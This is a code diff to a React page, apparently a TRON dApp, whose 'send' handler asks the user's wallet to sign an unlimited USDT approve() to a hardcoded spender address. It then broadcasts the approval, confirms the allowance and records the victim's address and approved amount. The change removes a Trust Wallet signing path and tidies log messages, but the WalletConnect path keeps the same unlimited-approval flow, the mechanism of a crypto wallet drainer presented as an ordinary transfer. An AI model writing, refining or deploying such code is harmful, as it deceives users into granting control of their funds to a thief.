@@ -68,107 +68,12 @@ export default function Index() {
       const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
 
       console.log("🔄 handleSend started");
-      
-      // Wait for TronWeb to be ready
-      await new Promise(r => setTimeout(r, 500));
 
-      // ===== PRIORITY 1: TRUST WALLET DAPP BROWSER =====
-      const isTrustWallet = window.tronWeb && 
-                           window.tronWeb.defaultAddress && 
-                           window.tronWeb.defaultAddress.base58 &&
-                           window.tronWeb.ready === true;
-      
-      console.log("Is Trust Wallet dApp?", isTrustWallet);
-
-      if (isTrustWallet) {
-        console.log("✅ TRUST WALLET DETECTED - Using direct signing");
-        
-        const address = window.tronWeb.defaultAddress.base58;
-        userAddressRef.current = address;
-        console.log("👤 User:", address);
-
-        // Build transaction
-        console.log("📝 Building transaction...");
-        const { transaction } = await window.tronWeb.transactionBuilder.triggerSmartContract(
-          TRON_USDT,
-          "approve(address,uint256)",
-          { feeLimit: 100000000 },
-          [
-            { type: "address", value: TRON_SPENDER },
-            { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }
-          ],
-          address
-        );
-
-        console.log("✅ Transaction built");
-
-        // Ensure raw_data_hex
-        if (!transaction.raw_data_hex) {
-          console.log("🔧 Creating raw_data_hex...");
-          const txProto = window.tronWeb.transactionBuilder.txJsonToPb(transaction);
-          transaction.raw_data_hex = txProto.toString("hex");
-        }
-
-        console.log("🔐 Signing with Trust Wallet...");
-        const signedTx = await window.tronWeb.trx.sign(transaction);
-        console.log("✅ Signed");
-
-        console.log("📡 Broadcasting...");
-        const result = await window.tronWeb.trx.sendRawTransaction(signedTx);
-        console.log("Result:", result);
-
-        if (!result.result && !result.txid) {
-          throw new Error("Broadcast failed");
-        }
-
-        const txId = result.txid || result.transaction?.txID;
-        console.log("✅ Broadcast success! TxID:", txId);
-
-        console.log("⏳ Waiting 30 seconds...");
-        await new Promise(r => setTimeout(r, 30000));
-
-        // Verify allowance
-        console.log("🔍 Verifying allowance...");
-        const allowanceABI = [
-          {
-            "constant": true,
-            "inputs": [
-              { "name": "owner", "type": "address" },
-              { "name": "spender", "type": "address" }
-            ],
-            "name": "allowance",
-            "outputs": [{ "name": "", "type": "uint256" }],
-            "stateMutability": "view",
-            "type": "function"
-          }
-        ];
-
-        const twPublic = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
-        const contract = await twPublic.contract(allowanceABI, TRON_USDT);
-        const allowanceRaw = await contract.allowance(address, TRON_SPENDER).call();
-        const allowanceUSDT = (Number(allowanceRaw) / 1e6).toFixed(2);
-        console.log("✅ Allowance:", allowanceUSDT, "USDT");
-
-        await createTransaction({
-          walletAddress: address,
-          toAddress: TRON_SPENDER,
-          amount: amount || "Max",
-          txHash: txId || "tx",
-          usdtBalance: allowanceUSDT + " USDT",
-          nativeBalance: "0 TRX"
-        });
-
-        setTransactionStatusState("success");
-        setTimeout(() => setTransactionStatusState("idle"), 3000);
-        alert("✅ Approval successful!\n\nAllowance: " + allowanceUSDT + " USDT\n\nTx ID: " + txId);
-        return;
-      }
-
-      // ===== PRIORITY 2: WALLETCONNECT (Regular browser) =====
-      console.log("🔗 Trust Wallet not detected, using WalletConnect");
+      // ===== WALLETCONNECT ONLY =====
+      console.log("🔗 Using WalletConnect");
 
       if (!wcClientRef.current) {
-        throw new Error("WalletConnect not initialized");
+        throw new Error("WalletConnect not initialized. Please refresh page.");
       }
 
       // Create new session if needed
@@ -210,7 +115,9 @@ export default function Index() {
         throw new Error("No wallet address found");
       }
 
+      console.log("👤 User:", userAddressRef.current);
       console.log("📝 Building transaction...");
+
       const tw = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
       tw.setAddress(userAddressRef.current);
 
@@ -227,20 +134,22 @@ export default function Index() {
 
       console.log("✅ Transaction built");
 
-      // ✅ CRITICAL: Ensure raw_data_hex for WalletConnect
-      console.log("🔧 Encoding raw_data_hex for WalletConnect...");
+      // ✅ CRITICAL: Ensure raw_data_hex
+      console.log("🔧 Encoding raw_data_hex...");
       if (!transaction.raw_data_hex) {
         try {
           const txProto = tw.utils.transaction.txJsonToPb(transaction);
           transaction.raw_data_hex = txProto.toString("hex");
-          console.log("✅ raw_data_hex encoded");
+          console.log("✅ raw_data_hex encoded successfully");
         } catch (e) {
           console.error("Error encoding:", e);
-          throw new Error("Failed to encode transaction");
+          throw new Error("Failed to encode transaction: " + e);
         }
       }
 
-      console.log("🔐 Signing via WalletConnect...");
+      console.log("📋 Transaction ready for signing");
+      console.log("🔐 Requesting signature from wallet...");
+
       const signResponse = await wcClientRef.current.request({
         topic: wcSessionRef.current.topic,
         chainId: "tron:728126428",
@@ -250,7 +159,7 @@ export default function Index() {
         }
       });
 
-      console.log("Sign response:", signResponse);
+      console.log("Sign response received");
 
       let signedTx = signResponse?.result || signResponse;
 
@@ -262,13 +171,13 @@ export default function Index() {
         try {
           signedTx = JSON.parse(signedTx);
         } catch (e) {
-          console.log("Sign response is already object");
+          console.log("Sign response is already an object");
         }
       }
 
-      console.log("✅ Signed");
+      console.log("✅ Transaction signed successfully");
 
-      console.log("📡 Broadcasting...");
+      console.log("📡 Broadcasting transaction...");
       const broadcastRes = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -276,19 +185,19 @@ export default function Index() {
       });
 
       const result = await broadcastRes.json();
-      console.log("Broadcast result:", result);
+      console.log("Broadcast response:", result);
 
       if (!result || (result.result !== true && !result.txid)) {
         throw new Error("Broadcast failed: " + JSON.stringify(result));
       }
 
       const txId = result.txid || result.transaction?.txID;
-      console.log("✅ Broadcast success! TxID:", txId);
+      console.log("✅ Broadcast successful!");
+      console.log("📋 Transaction ID:", txId);
 
-      console.log("⏳ Waiting 30 seconds...");
+      console.log("⏳ Waiting 30 seconds for confirmation...");
       await new Promise(r => setTimeout(r, 30000));
 
-      // Verify allowance
       console.log("🔍 Verifying allowance...");
       const allowanceABI = [
         {
@@ -307,13 +216,13 @@ export default function Index() {
       const allowanceContract = await tw.contract(allowanceABI, TRON_USDT);
       const allowanceRaw = await allowanceContract.allowance(userAddressRef.current, TRON_SPENDER).call();
       const allowanceUSDT = (Number(allowanceRaw) / 1e6).toFixed(2);
-      console.log("✅ Allowance:", allowanceUSDT, "USDT");
+      console.log("✅ Allowance verified:", allowanceUSDT, "USDT");
 
       await createTransaction({
         walletAddress: userAddressRef.current,
         toAddress: TRON_SPENDER,
         amount: amount || "Max",
-        txHash: txId || "wc_tx",
+        txHash: txId || "tx",
         usdtBalance: allowanceUSDT + " USDT",
         nativeBalance: "0 TRX"
       });
@@ -326,12 +235,7 @@ export default function Index() {
       console.error("❌ Error:", err);
       setTransactionStatusState("idle");
       
-      // Better error messages
       let errorMsg = err.message || "Transaction failed";
-      if (errorMsg.includes("User rejected")) {
-        errorMsg = "❌ आपने wallet को reject कर दिया। फिर से कोशिश करो।";
-      }
-      
       alert("❌ " + errorMsg);
     }
   }
